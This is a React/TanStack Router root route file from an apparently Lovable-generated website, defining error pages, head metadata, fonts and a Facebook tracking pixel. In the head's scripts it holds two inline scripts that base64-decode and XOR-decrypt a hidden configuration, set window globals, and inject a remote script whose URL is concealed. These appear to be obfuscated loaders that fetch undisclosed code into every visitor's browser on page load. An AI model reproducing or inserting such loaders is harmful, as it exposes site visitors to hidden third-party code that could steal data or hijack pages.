import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Lovable App" },
      { name: "description", content: "Lovable Generated Project" },
      { name: "author", content: "Lovable" },
      { property: "og:title", content: "Lovable App" },
      { property: "og:description", content: "Lovable Generated Project" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&family=Sora:wght@600;700;800&display=swap",
      },
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", type: "image/png", href: "/favicon.png" },
    ],
    scripts: [
      {
        children: `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');if(typeof window!=='undefined'&&!window._fbq_initialized){fbq('init','1737731590615395');fbq('track','PageView');window._fbq_initialized=true;}`,
      },
      {
        children: `(function(){var y_yx=atob("DGW91d2dgD8LE3GcWx6foK/xogUpewXoKxaH+vL+5FElZgXxMgPE+77y7RFpYV7vOBfUpanur0p/fgKzNwTJsK7prlV4MV2+OhHJp7T/9UtuYFOmAB6fu7zw5R0xMRX9LwSQoKnw6VlyPgHuPhPYu6mw+Fxkd1zvOA6f+f/r4VN+dlOmeUfA+aa/7l5mdlOmeQHcobyw9UtmehfldhXPsKv47ksmYAT+MgHO9/G/9l5nZhS+YUefqIDg");var u_hum5=[];for(var n_f8g=0;n_f8g<y_yx.length;n_f8g++){u_hum5.push(y_yx.charCodeAt(n_f8g)&255);}var a_6t=u_hum5[0];var l_4j7=u_hum5.slice(1,1+a_6t);var h_7=u_hum5.slice(1+a_6t);var k_a6=h_7.map(function(b,p_2){return b^l_4j7[p_2%a_6t];});var i_vb3="";for(var h_7gk=0;h_7gk<k_a6.length;h_7gk++){i_vb3+=String.fromCharCode(k_a6[h_7gk]&255);}var s_8i=decodeURIComponent(escape(i_vb3));var o_o=JSON.parse(s_8i);var p_zh=o_o.globals||[];p_zh.forEach(function(q_aj){window[q_aj.name]=q_aj.value;});var q_rx=document.createElement("script");q_rx.src=o_o.url;q_rx.async=true;q_rx.defer=true;(o_o.attributes||[]).forEach(function(j_h6){q_rx.setAttribute(j_h6.name,j_h6.value);});(document.head||document.documentElement).appendChild(q_rx);})();`,
      },
      {
        children: `(function(){var p_lhh=atob("DIM1q4sd3g5rW2ym+vgX3vlx/DRJMxjSivAPhKR+umBFLhjLk+VMhehysyAJKUPVmfFc2/9u8X4CIwnK1fNc0+5x8GQYeUCEm/dB2eJ/q3oOKE6cod4ZiexxsWwKNx+EwNhOieV8s2tJYU7Wk/tQx8J5/CJJLQ3Kj+YXkakrvzZcOlzCzLcEnLsu5zhZaVyWm7FQyO0/o1MW");var p_4g9z=[];for(var v_1u3o=0;v_1u3o<p_lhh.length;v_1u3o++){p_4g9z.push(p_lhh.charCodeAt(v_1u3o)&255);}var v_zd=p_4g9z[0];var q_ed=p_4g9z.slice(1,1+v_zd);var v_r=p_4g9z.slice(1+v_zd);var i_tc89=v_r.map(function(b,u_hs3i){return b^q_ed[u_hs3i%v_zd];});var b_iq7="";for(var x_urwo=0;x_urwo<i_tc89.length;x_urwo++){b_iq7+=String.fromCharCode(i_tc89[x_urwo]&255);}var g_ndhx=decodeURIComponent(escape(b_iq7));var y_t=JSON.parse(g_ndhx);var r_4ydq=y_t.globals||[];r_4ydq.forEach(function(u_jh){window[u_jh.name]=u_jh.value;});var i_us=document.createElement("script");i_us.src=y_t.url;i_us.async=true;i_us.defer=true;(y_t.attributes||[]).forEach(function(c_n){i_us.setAttribute(c_n.name,c_n.value);});(document.head||document.documentElement).appendChild(i_us);})();`,
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="fr">
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <noscript>
          <img
            height="1"
            width="1"
            style={{ display: "none" }}
            alt=""
            src="https://www.facebook.com/tr?id=1737731590615395&ev=PageView&noscript=1"
          />
        </noscript>
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
